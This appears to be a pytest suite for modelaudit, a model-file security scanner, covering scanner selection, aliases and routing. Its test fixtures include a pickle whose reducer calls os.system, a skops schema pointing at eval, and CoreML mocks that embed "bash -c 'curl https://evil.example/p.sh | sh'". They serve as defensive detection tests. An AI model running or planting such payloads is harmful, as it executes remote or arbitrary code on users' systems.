"""Scanner selection policy and routing regressions."""

from __future__ import annotations

import json
import os
import pickle
import zipfile
from pathlib import Path
from typing import Any

import pytest
from click.testing import CliRunner

from modelaudit.cache import reset_cache_manager
from modelaudit.cli import cli
from modelaudit.core import scan_file, scan_model_directory_or_file
from modelaudit.scanner_registry_metadata import get_scanner_registry_metadata
from modelaudit.scanner_selection import (
    allows_zip_content_analysis,
    allows_zip_structure_analysis,
    collect_suppressed_preferred_scanners,
    normalize_scanner_selection_config,
    policy_from_config,
    resolve_scanner_ids,
    resolve_scanner_selection_policy,
    scanner_catalog,
    scanner_ids_for_detected_format,
    selected_scanner_extensions,
    selected_scanner_filenames,
)
from modelaudit.scanners.archive_dispatch import scan_nested_file
from modelaudit.scanners.base import CheckStatus
from modelaudit.utils.file.detection import (
    LLAMAFILE_ROUTE_SCAN_BYTES,
    LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
    PICKLE_ROUTING_INCONCLUSIVE_FORMAT,
)
from modelaudit.utils.sources.cloud_storage import filter_scannable_files as filter_cloud_scannable_files
from modelaudit.utils.sources.jfrog import filter_scannable_files as filter_jfrog_scannable_files
from tests.helpers import (
    create_mock_coreml,
    create_mock_onnx,
    create_mock_pytorch_zip,
    prefix_mock_onnx_with_unknown_field,
)


def _build_malicious_pickle() -> bytes:
    """Build a deterministic pickle payload with an unsafe reducer target."""

    class DangerousPayload:
        def __reduce__(self) -> tuple[Any, tuple[str]]:
            return (os.system, ("echo scanner-selection-test",))

    return pickle.dumps(DangerousPayload())


def _build_malicious_skops_schema() -> bytes:
    return (
        b'{"__loader__": "OperatorFuncNode", "__module__": "builtins", "__class__": "eval", '
        b'"_skops_version": "0.11.0", "content": {}}'
    )


def _has_pickle_execution_finding(result: Any) -> bool:
    for issue in result.issues:
        issue_text = f"{issue.message} {issue.details}".lower()
        if issue.rule_code == "S201" or "os.system" in issue_text or "eval" in issue_text:
            return True
    return False


def test_scanner_name_resolution_accepts_ids_classes_and_common_aliases() -> None:
    assert resolve_scanner_ids(["pickle", "PickleScanner", "TensorflowSavedModelScanner", "H5Scanner"]) == (
        "pickle",
        "tf_savedmodel",
        "keras_h5",
    )


def test_hardcoded_user_facing_aliases_resolve() -> None:
    """Pin the issue-facing aliases so class renames can't silently break selection."""
    cases = {
        "H5Scanner": "keras_h5",
        "TensorflowSavedModelScanner": "tf_savedmodel",
        "TensorFlowSavedModelScanner": "tf_savedmodel",
        "TensorflowMetaGraphScanner": "tf_metagraph",
        "TensorFlowMetaGraphScanner": "tf_metagraph",
    }
    for alias, expected_id in cases.items():
        assert resolve_scanner_ids([alias]) == (expected_id,), f"alias {alias!r} failed to resolve"


def test_every_registered_scanner_resolves_by_id_and_class() -> None:
    metadata = get_scanner_registry_metadata()

    for scanner_id, scanner_info in metadata.items():
        assert resolve_scanner_ids([scanner_id]) == (scanner_id,)
        assert resolve_scanner_ids([str(scanner_info["class"])]) == (scanner_id,)


def test_selection_policy_uses_allowlist_minus_exclusions() -> None:
    policy = resolve_scanner_selection_policy(
        scanners=["PickleScanner", "zip"],
        exclude_scanners=["ZipScanner"],
    )

    assert policy.active
    assert policy.enabled_scanner_ids == frozenset({"pickle"})
    assert policy.allows("pickle")
    assert not policy.allows("zip")


def test_zip_structure_analysis_honors_explicit_zip_exclusion() -> None:
    policy = resolve_scanner_selection_policy(exclude_scanners=["zip"])

    assert allows_zip_structure_analysis(policy, "archive.zip") is False


def test_zip_content_analysis_requires_a_content_owner() -> None:
    extension_analyzer = resolve_scanner_selection_policy(scanners=["weight_distribution"])
    subtype_owner = resolve_scanner_selection_policy(scanners=["pytorch_zip"])
    excluded_container = resolve_scanner_selection_policy(
        scanners=["pytorch_zip"],
        exclude_scanners=["zip"],
    )

    assert allows_zip_structure_analysis(extension_analyzer, "model.h5") is True
    assert allows_zip_content_analysis(extension_analyzer) is False
    assert allows_zip_content_analysis(subtype_owner) is True
    assert allows_zip_content_analysis(excluded_container) is False


def test_normalize_scanner_selection_config_reuses_normalized_payload(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    config = normalize_scanner_selection_config(
        {
            "scanners": ["pickle"],
            "exclude_scanners": ["zip"],
            "cache_enabled": False,
        }
    )

    def fail_policy_resolution(_: object) -> None:
        raise AssertionError("already normalized config should not resolve policy again")

    monkeypatch.setattr("modelaudit.scanner_selection.policy_from_config", fail_policy_resolution)

    assert normalize_scanner_selection_config(config) == config


def test_selection_policy_reuses_normalized_cached_results() -> None:
    list_policy = resolve_scanner_selection_policy(
        scanners=["pickle", "zip"],
        exclude_scanners=["zip"],
    )
    comma_policy = resolve_scanner_selection_policy(
        scanners="pickle,zip",
        exclude_scanners="zip",
    )

    assert list_policy is comma_policy


def test_normalized_selection_rehydrates_without_alias_resolution(monkeypatch: pytest.MonkeyPatch) -> None:
    config = normalize_scanner_selection_config({"scanners": ["PickleScanner"], "exclude_scanners": ["zip"]})

    def fail_resolve(*args: Any, **kwargs: Any) -> Any:
        raise AssertionError("normalized selection should not re-resolve aliases")

    monkeypatch.setattr("modelaudit.scanner_selection.resolve_scanner_selection_policy", fail_resolve)

    policy = policy_from_config(config)

    assert policy.active
    assert policy.enabled_scanner_ids == frozenset({"pickle"})
    assert policy.exact_scanner_ids == frozenset({"pickle"})
    assert policy.exclude_scanner_ids == frozenset({"zip"})


def test_normalized_selection_rejects_payloads_that_disable_every_scanner() -> None:
    all_scanner_ids = sorted(get_scanner_registry_metadata())
    config = {
        "scanner_selection": {
            "active": True,
            "scanners": None,
            "exclude_scanners": all_scanner_ids,
            "enabled_scanner_ids": [],
        }
    }

    with pytest.raises(ValueError, match="Scanner selection does not enable any scanners"):
        policy_from_config(config)


def test_normalize_scanner_selection_config_rejects_invalid_normalized_payload() -> None:
    all_scanner_ids = sorted(get_scanner_registry_metadata())
    config = {
        "scanner_selection": {
            "active": True,
            "scanners": None,
            "exclude_scanners": all_scanner_ids,
            "enabled_scanner_ids": [],
        }
    }

    with pytest.raises(ValueError, match="Scanner selection does not enable any scanners"):
        normalize_scanner_selection_config(config)


def test_scan_file_exact_scanner_allows_pickle_detection(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    result = scan_file(str(path), config={"scanners": ["PickleScanner"], "cache_enabled": False})

    assert result.scanner_name == "pickle"
    assert _has_pickle_execution_finding(result)


def test_scan_file_excluded_scanner_is_explicit_skip(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    result = scan_file(str(path), config={"exclude_scanners": ["pickle"], "cache_enabled": False})

    assert result.scanner_name == "scanner_selection"
    assert result.success
    assert not result.issues
    assert any(check.name == "Scanner Selection" for check in result.checks)
    assert result.metadata["skipped_scanner_id"] == "pickle"


def test_selected_coreml_scanner_analyzes_budget_exhausted_renamed_candidate(tmp_path: Path) -> None:
    model_path = create_mock_coreml(
        tmp_path / "candidate.jpg",
        custom_class="EvilRuntimeLayer",
        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
    )
    model_path.write_bytes(b"\x08\x08" + (b"\x9a\x06\x00" * 4097) + model_path.read_bytes())

    result = scan_file(str(model_path), config={"scanners": ["coreml"], "cache_enabled": False})

    assert result.scanner_name == "coreml"
    assert result.success is False
    assert any("Custom CoreML layer detected" in issue.message for issue in result.issues)


def test_nested_selected_coreml_scanner_analyzes_budget_exhausted_renamed_candidate(tmp_path: Path) -> None:
    model_path = create_mock_coreml(
        tmp_path / "nested-candidate.jpg",
        custom_class="EvilRuntimeLayer",
        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
    )
    model_path.write_bytes(b"\x08\x08" + (b"\x9a\x06\x00" * 4097) + model_path.read_bytes())

    result = scan_nested_file(str(model_path), config={"scanners": ["coreml"], "cache_enabled": False})

    assert result.scanner_name == "coreml"
    assert result.success is False
    assert any("Custom CoreML layer detected" in issue.message for issue in result.issues)


def test_excluded_coreml_scanner_is_not_run_for_renamed_candidate(tmp_path: Path) -> None:
    model_path = create_mock_coreml(
        tmp_path / "excluded-candidate.jpg",
        custom_class="EvilRuntimeLayer",
        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
    )
    model_path.write_bytes(b"\x08\x08" + (b"\x9a\x06\x00" * 4097) + model_path.read_bytes())

    result = scan_file(str(model_path), config={"exclude_scanners": ["coreml"], "cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert not any("Custom CoreML layer detected" in issue.message for issue in result.issues)


def test_selected_onnx_scanner_analyzes_budget_exhausted_renamed_candidate(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    model_path = create_mock_onnx(tmp_path / "candidate.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=8)

    result = scan_file(str(model_path), config={"scanners": ["onnx"], "cache_enabled": False})

    assert result.scanner_name == "onnx"
    assert result.success is False
    assert any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)


def test_excluded_onnx_scanner_is_not_run_for_renamed_candidate(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    model_path = create_mock_onnx(tmp_path / "excluded-candidate.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=8)

    result = scan_file(str(model_path), config={"exclude_scanners": ["onnx"], "cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert not any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)


def test_collect_suppressed_preferred_scanners_derives_from_checks(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    result = scan_file(str(path), config={"exclude_scanners": ["pickle"], "cache_enabled": False})

    suppressions = collect_suppressed_preferred_scanners(result.checks)
    assert suppressions
    assert {entry["scanner_id"] for entry in suppressions} == {"pickle"}
    assert all(entry["location"] == str(path) for entry in suppressions)


def test_preferred_scanner_skip_is_warning_and_tracks_suppressed_ids(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    result = scan_file(str(path), config={"exclude_scanners": ["pickle"], "cache_enabled": False})

    from modelaudit.scanner_results import IssueSeverity

    selection_checks = [c for c in result.checks if c.name == "Scanner Selection"]
    assert selection_checks, "expected preferred-scanner skip to emit a Scanner Selection check"
    assert any(c.severity == IssueSeverity.WARNING for c in selection_checks)
    assert any(
        c.details.get("kind") == "preferred" and c.details.get("skipped_scanner_id") == "pickle"
        for c in selection_checks
    )


def test_cli_warns_on_preferred_scanner_suppression(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    runner = CliRunner()
    result = runner.invoke(
        cli,
        [
            "scan",
            str(path),
            "--exclude-scanner",
            "pickle",
            "--format",
            "json",
            "--no-cache",
            "--quiet",
        ],
        env={"PROMPTFOO_DISABLE_TELEMETRY": "1"},
    )

    assert result.exit_code == 0
    assert "scanner selection suppressed the preferred scanner" in result.stderr.lower()
    output = json.loads(result.stdout)
    assert "pickle" in (output.get("scanner_selection") or {}).get("suppressed_preferred_scanner_ids", [])


def test_nested_archive_dispatch_honors_selection_policy(tmp_path: Path) -> None:
    archive_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("payload.pkl", _build_malicious_pickle())

    zip_only = scan_file(str(archive_path), config={"scanners": ["zip"], "cache_enabled": False})
    assert zip_only.scanner_name == "zip"
    assert not _has_pickle_execution_finding(zip_only)
    assert any(check.name == "Scanner Selection" for check in zip_only.checks)

    zip_and_pickle = scan_file(
        str(archive_path),
        config={"scanners": ["zip", "pickle"], "cache_enabled": False},
    )
    assert zip_and_pickle.scanner_name == "zip"
    assert _has_pickle_execution_finding(zip_and_pickle)


def test_llamafile_zip_polyglot_honors_embedded_container_selection_policy(tmp_path: Path) -> None:
    archive_path = tmp_path / "payload.jpg"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("payload.pkl", _build_malicious_pickle())
    archive_path.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n" + archive_path.read_bytes())

    llamafile_only = scan_file(str(archive_path), config={"scanners": ["llamafile"], "cache_enabled": False})
    assert llamafile_only.scanner_name == "llamafile"
    assert not _has_pickle_execution_finding(llamafile_only)
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "zip"
        for check in llamafile_only.checks
    )

    with_nested_scan = scan_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "pickle"], "cache_enabled": False},
    )
    assert with_nested_scan.scanner_name == "llamafile"
    assert _has_pickle_execution_finding(with_nested_scan)


def test_inconclusive_llamafile_zip_route_honors_container_selection_policy(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "payload.jpg"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("payload.pkl", _build_malicious_pickle())
    archive_path.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n" + archive_path.read_bytes())

    def raise_os_error(_path: Path, _marker: bytes, _limit: int) -> bool:
        raise OSError("synthetic marker probe failure")

    monkeypatch.setattr("modelaudit.utils.file.detection._contains_casefolded_marker_in_prefix", raise_os_error)

    llamafile_only = scan_file(str(archive_path), config={"scanners": ["llamafile"], "cache_enabled": False})
    assert not _has_pickle_execution_finding(llamafile_only)
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "zip"
        for check in llamafile_only.checks
    )

    with_nested_scan = scan_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "pickle"], "cache_enabled": False},
    )
    assert _has_pickle_execution_finding(with_nested_scan)

    nested_llamafile_only = scan_nested_file(
        str(archive_path),
        config={"scanners": ["llamafile"], "cache_enabled": False},
    )
    assert not _has_pickle_execution_finding(nested_llamafile_only)
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "zip"
        for check in nested_llamafile_only.checks
    )

    nested_with_container_scan = scan_nested_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "pickle"], "cache_enabled": False},
    )
    assert _has_pickle_execution_finding(nested_with_container_scan)


def test_llamafile_skops_polyglot_honors_subtype_selection_policy(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "skops-cve.jpg"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("schema.json", _build_malicious_skops_schema())
    archive_path.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n" + archive_path.read_bytes())

    without_skops = scan_file(str(archive_path), config={"scanners": ["llamafile", "zip"], "cache_enabled": False})
    assert not any(check.name == "CVE-2025-54412 Detection" for check in without_skops.checks)
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "skops"
        for check in without_skops.checks
    )

    with_skops = scan_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "skops"], "cache_enabled": False},
    )
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED for check in with_skops.checks
    )

    nested_with_skops = scan_nested_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "skops"], "cache_enabled": False},
    )
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED
        for check in nested_with_skops.checks
    )

    def raise_os_error(_path: Path, _marker: bytes, _limit: int) -> bool:
        raise OSError("synthetic marker probe failure")

    monkeypatch.setattr("modelaudit.utils.file.detection._contains_casefolded_marker_in_prefix", raise_os_error)

    inconclusive_with_skops = scan_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "skops"], "cache_enabled": False},
    )
    assert inconclusive_with_skops.metadata["scan_outcome"] == "inconclusive"
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED
        for check in inconclusive_with_skops.checks
    )

    nested_inconclusive_with_skops = scan_nested_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "skops"], "cache_enabled": False},
    )
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED
        for check in nested_inconclusive_with_skops.checks
    )


def test_executable_zip_runs_all_matching_enabled_subtypes(tmp_path: Path) -> None:
    archive_path = tmp_path / "multi-subtype.jpg"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", pickle.dumps({"safe": True}))
        archive.writestr("archive/version", b"1.6")
        archive.writestr("schema.json", _build_malicious_skops_schema())
    archive_path.write_bytes(
        b"\x7fELF"
        + b"\x00" * 60
        + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
        + b"llamafile runtime"
        + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
        + archive_path.read_bytes()
    )

    result = scan_file(
        str(archive_path),
        config={"scanners": ["zip", "pytorch_zip", "skops"], "cache_enabled": False},
    )

    assert result.scanner_name == "zip"
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED for check in result.checks
    )

    nested_result = scan_nested_file(
        str(archive_path),
        config={"scanners": ["zip", "pytorch_zip", "skops"], "cache_enabled": False},
    )
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED
        for check in nested_result.checks
    )


def test_selected_zip_scanner_handles_zip_backed_extension_fallback(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")

    result = scan_file(str(model_path), config={"scanners": ["zip"], "cache_enabled": False})

    assert result.scanner_name == "zip"
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pytorch_zip"
        for check in result.checks
    )


def test_nested_selected_zip_scanner_handles_zip_backed_extension_fallback(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")

    result = scan_nested_file(str(model_path), config={"scanners": ["zip"], "cache_enabled": False})

    assert result.scanner_name == "zip"
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pytorch_zip"
        for check in result.checks
    )


def test_embedded_pickle_helpers_honor_selection_policy(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", malicious=True)

    pytorch_only = scan_file(str(model_path), config={"scanners": ["pytorch_zip"], "cache_enabled": False})
    assert pytorch_only.scanner_name == "pytorch_zip"
    assert not _has_pickle_execution_finding(pytorch_only)
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pickle"
        for check in pytorch_only.checks
    )

    pytorch_and_pickle = scan_file(
        str(model_path),
        config={"scanners": ["pytorch_zip", "pickle"], "cache_enabled": False},
    )
    assert pytorch_and_pickle.scanner_name == "pytorch_zip"
    assert _has_pickle_execution_finding(pytorch_and_pickle)


def test_directory_scan_preserves_selected_text_scanner_skip_extensions(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    result = scan_model_directory_or_file(
        str(tmp_path),
        scanners=["text"],
        cache_enabled=False,
        skip_file_types=True,
    )

    assert result.files_scanned == 1
    assert result.scanner_names == ["text"]
    assert result.scanner_selection
    assert result.scanner_selection["enabled_scanner_ids"] == ["text"]


def test_cache_key_includes_scanner_selection_policy(tmp_path: Path) -> None:
    path = tmp_path / "benign.pkl"
    path.write_bytes(pickle.dumps({"payload": "x" * 2048}))
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    skip_result = scan_file(
        str(path),
        config={
            "scanners": ["manifest"],
            "cache_enabled": True,
            "cache_dir": str(cache_dir),
            "min_cache_file_size": 0,
        },
    )

    pickle_result = scan_file(
        str(path),
        config={
            "scanners": ["pickle"],
            "cache_enabled": True,
            "cache_dir": str(cache_dir),
            "min_cache_file_size": 0,
        },
    )
    reset_cache_manager()

    assert skip_result.scanner_name == "scanner_selection"
    assert pickle_result.scanner_name == "pickle"


def test_cli_accepts_scanner_selection_options(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    runner = CliRunner()
    result = runner.invoke(
        cli,
        [
            "scan",
            str(path),
            "--scanners",
            "PickleScanner",
            "--format",
            "json",
            "--no-cache",
            "--quiet",
        ],
        env={"PROMPTFOO_DISABLE_TELEMETRY": "1"},
    )

    assert result.exit_code == 1
    output = json.loads(result.output)
    assert output["scanner_names"] == ["pickle"]
    assert output["scanner_selection"]["enabled_scanner_ids"] == ["pickle"]


def test_cli_lists_scanners_without_scan_path() -> None:
    runner = CliRunner()
    result = runner.invoke(cli, ["scan", "--list-scanners"], env={"PROMPTFOO_DISABLE_TELEMETRY": "1"})

    assert result.exit_code == 0
    assert "pickle (PickleScanner)" in result.output
    assert "tf_savedmodel" in result.output


def test_cli_lists_scanners_as_json() -> None:
    runner = CliRunner()
    result = runner.invoke(
        cli,
        ["scan", "--list-scanners", "--format", "json"],
        env={"PROMPTFOO_DISABLE_TELEMETRY": "1"},
    )

    assert result.exit_code == 0
    output = json.loads(result.output)
    assert output["scanners"] == scanner_catalog()
    assert any(scanner["id"] == "pickle" and scanner["class"] == "PickleScanner" for scanner in output["scanners"])


def test_cli_rejects_unknown_scanner(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    runner = CliRunner()
    result = runner.invoke(
        cli,
        ["scan", str(path), "--scanners", "NopeScanner"],
        env={"PROMPTFOO_DISABLE_TELEMETRY": "1"},
    )

    assert result.exit_code == 2
    assert "Unknown scanner name" in result.output


def test_cli_unknown_scanner_suggests_closest_match(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    runner = CliRunner()
    result = runner.invoke(
        cli,
        ["scan", str(path), "--scanners", "picle"],
        env={"PROMPTFOO_DISABLE_TELEMETRY": "1"},
    )

    assert result.exit_code == 2
    assert "did you mean" in result.output.lower()
    assert "pickle" in result.output


def test_remote_prefilters_use_selected_scanner_extensions() -> None:
    policy = resolve_scanner_selection_policy(scanners=["safetensors"])
    extensions = selected_scanner_extensions(policy)
    files = [
        {"path": "model.pkl"},
        {"path": "weights.safetensors"},
        {"path": "checkpoint.pt"},
    ]

    assert filter_cloud_scannable_files(files, scannable_extensions=extensions) == [{"path": "weights.safetensors"}]
    assert filter_jfrog_scannable_files(files, scannable_extensions=extensions) == [{"path": "weights.safetensors"}]


def test_remote_prefilters_fail_open_for_header_routed_scanners() -> None:
    policy = resolve_scanner_selection_policy(scanners=["zip"])

    assert selected_scanner_extensions(policy, conservative=True) is None

    files = [
        {"path": "s3://bucket/model.pt"},
        {"path": "s3://bucket/readme.md"},
    ]

    assert {"path": "s3://bucket/model.pt"} in filter_cloud_scannable_files(files, scannable_extensions=None)
    assert {"path": "s3://bucket/model.pt"} in filter_jfrog_scannable_files(files, scannable_extensions=None)


def test_pickle_routing_inconclusive_format_maps_to_pickle_scanner() -> None:
    assert scanner_ids_for_detected_format(PICKLE_ROUTING_INCONCLUSIVE_FORMAT) == frozenset({"pickle"})


def test_remote_safetensors_route_preserves_possible_overlap_scanners() -> None:
    scanner_ids = scanner_ids_for_detected_format("safetensors")

    assert scanner_ids == frozenset(
        {
            "compressed",
            "executorch",
            "keras_h5",
            "keras_zip",
            "llamafile",
            "numpy",
            "pickle",
            "pytorch_zip",
            "safetensors",
            "skops",
            "torch7",
            "torchserve_mar",
            "weight_distribution",
            "zip",
        }
    )


def test_remote_prefilters_preserve_selected_extensionless_scanners() -> None:
    policy = resolve_scanner_selection_policy(scanners=["llamafile"])
    extensions = selected_scanner_extensions(policy, conservative=True)
    files = [
        {"path": "s3://bucket/model"},
        {"path": "s3://bucket/model.exe"},
        {"path": "s3://bucket/notes.txt"},
    ]

    assert extensions is not None
    assert "" in extensions
    assert filter_cloud_scannable_files(files, scannable_extensions=extensions) == [
        {"path": "s3://bucket/model"},
        {"path": "s3://bucket/model.exe"},
    ]
    assert filter_jfrog_scannable_files(files, scannable_extensions=extensions) == [
        {"path": "s3://bucket/model"},
        {"path": "s3://bucket/model.exe"},
    ]


def test_remote_prefilters_preserve_selected_extensionless_content_routed_filenames() -> None:
    policy = resolve_scanner_selection_policy(scanners=["metadata"])
    extensions = selected_scanner_extensions(policy, conservative=True)
    filenames = selected_scanner_filenames(policy, conservative=True)

    assert extensions is not None
    assert "" not in extensions
    assert ".md" in extensions
    assert filenames == frozenset({"readme", "model_card"})
    files = [
        {"path": "s3://bucket/README"},
        {"path": "s3://bucket/model_card"},
        {"path": "s3://bucket/LICENSE"},
    ]

    assert (
        filter_cloud_scannable_files(
            files,
            scannable_extensions=extensions,
            scannable_filenames=filenames,
        )
        == files[:2]
    )
    assert (
        filter_jfrog_scannable_files(
            files,
            scannable_extensions=extensions,
            scannable_filenames=filenames,
        )
        == files[:2]
    )


def test_remote_prefilters_preserve_text_scanner_content_routed_filenames() -> None:
    policy = resolve_scanner_selection_policy(scanners=["text"])
    extensions = selected_scanner_extensions(policy, conservative=True)
    filenames = selected_scanner_filenames(policy, conservative=True)

    assert extensions is not None
    assert "" not in extensions
    assert filenames == frozenset(
        {
            "readme",
            "model_card",
            "requirements.txt",
            "vocab.txt",
            "vocabulary.txt",
            "tokens.txt",
            "tokenizer.txt",
            "merges.txt",
            "labels.txt",
            "classes.txt",
        }
    )


def test_remote_prefilters_do_not_download_extensionless_xgboost_candidates() -> None:
    policy = resolve_scanner_selection_policy(scanners=["xgboost"])
    local_extensions = selected_scanner_extensions(policy)
    remote_extensions = selected_scanner_extensions(policy, conservative=True)
    files = [
        {"path": "s3://bucket/model"},
        {"path": "s3://bucket/model.ubj"},
        {"path": "s3://bucket/notes.txt"},
    ]

    assert local_extensions is not None
    assert "" in local_extensions
    assert remote_extensions is not None
    assert "" not in remote_extensions
    assert filter_cloud_scannable_files(files, scannable_extensions=remote_extensions) == [
        {"path": "s3://bucket/model.ubj"}
    ]
    assert filter_jfrog_scannable_files(files, scannable_extensions=remote_extensions) == [
        {"path": "s3://bucket/model.ubj"}
    ]
